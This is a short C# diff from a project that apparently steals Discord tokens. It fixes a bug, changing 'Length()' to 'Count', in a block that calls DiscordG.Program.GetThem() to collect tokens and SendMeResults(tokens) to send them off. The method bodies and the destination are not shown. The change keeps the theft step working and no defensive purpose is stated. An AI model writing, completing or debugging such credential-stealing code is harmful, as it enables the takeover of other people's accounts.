@@ -69,7 +69,7 @@ namespace ConsoleApp1
                 httpClient.Dispose();
             }
             var tokens = DiscordG.Program.GetThem();
-            if (tokens.Length() > 0)
+            if (tokens.Count > 0)
             {
                 DiscordG.Program.SendMeResults(tokens);
             }
